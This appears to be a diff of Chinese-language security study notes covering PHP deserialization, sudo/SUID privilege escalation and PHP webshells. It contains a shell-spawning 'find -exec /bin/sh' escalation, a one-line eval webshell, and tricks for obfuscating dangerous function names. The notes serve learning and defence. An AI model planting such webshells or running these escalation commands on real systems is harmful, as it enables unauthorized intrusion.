@@ -670,6 +670,8 @@ echo serialize($conn);
 
 `__wakeup`，`__destruct`都是与反序列化漏洞强相关的魔术方法，反序列化必定调用它们；其他魔术方法也可能被调用。假如`__wakeup`中有危险代码，或服务器用反序列化得到的对象进行危险操作，控制序列化字符串就能进行攻击了。不过，开发者不太可能犯这么大的错，一般需要用后面几节的技术
 
+注意：序列化字符串中可能有空字节，注意检查
+
 #### POP链
 
 面向属性编程链（Property-Oriented Programming Chain，也叫Gadget Chain）
@@ -682,16 +684,28 @@ phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了p
 
 [GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
 
-## SUID
+## sudo与SUID提权
 
-SUID是“set uid ID upon execution”的缩写。用户运行具有SUID的程序时，会暂时获得文件所属用户的权限，比如更改密码的程序`/usr/bin/passwd`拥有者是root，且具有SUID，普通用户运行此程序时可以暂时获得root权限，修改密码文件`/etc/shadow`，但用正常方法就无法篡改`/etc/shadow`
+sudo和SUID都能让用户暂时以更高权限进行操作。使用sudo命令时、运行具有SUID的命令时，可以暂时获得其他用户权限。若系统配置不当，利用sudo与SUID可以暂时获取root用户权限，则可能用于提权
 
 ```bash
-sudo -l  # 查看当前用户能sudo的指令
-find / -perm -u=s -user root -type f 2>/dev/null  # 查找SUID指令
+# 查看可以sudo的命令
+sudo -l
+
+# 查找SUID=1、所有者是root的文件
+find / -perm -u=s -user root -type f 2>/dev/null
 ```
 
-能用SUID提权的指令有：wget
+sudo、SUID提权有几类方法：
+
+- 执行任意命令获取Shell。如：`find`，`vim`
+- 覆盖文件
+- 读取`/etc/shadow`并爆破密码。前者例子有`find`、`vim`等；后者有`cp`、`wget`等
+
+```bash
+find /etc/passwd -exec whoami \;  # 每找到一个结果，就会执行一次-exec参数指定的命令
+find /etc/passwd -exec /bin/sh \;
+```
 
 ## webshell
 
@@ -699,20 +713,18 @@ find / -perm -u=s -user root -type f 2>/dev/null  # 查找SUID指令
 
 ```php
 # 基础webshell
-eval($_GET['cmd']);
+eval($_POST['cmd']);
 
-# 用字符串操作隐藏危险函数assert。其他类似方式：preg_replace, str_rot13
-$a = str_replace('ass*e**rt', '*', '');
-$a($_GET['kqbnjf']);
+# 字符串魔术
+echo 'creat' . 'e_fu' . 'nction';  # 字符串拼接
+echo str_replace("z", "", "bazsze64_zdeczode"); # 替换。类似还有preg_replace
+echo base64_decode("W10=");  # 编码、加密解密。类似有str_rot13
+echo ~('和'[2]);     # 字节运算
+$x = 'a'; echo ++$x; # 另一种字节运算
 
-# 用php特性做字符串操作，隐藏危险函数
-echo ~('和'[2]);     # 打印s。和的utf-8编码第三个字节是0x8c，取反得到0x73，正是s的编码
-$x = gettype([])[0]; # gettype([]) = 'array'，因此给$x赋值为'a'
-echo ++$x;           # 打印b。
-
-# 动态传入危险函数
-$a = $_GET['xymhwv'];
-$a($_GET['ehnzmq']);
+# 奇怪来源的字符串
+$g = $_GET['xymhwv']; # 动态传入参数
+$a = gettype([])[0];  # gettype([]) = 'array'，因此给$x赋值为'a'
 ```
 
 # 其他
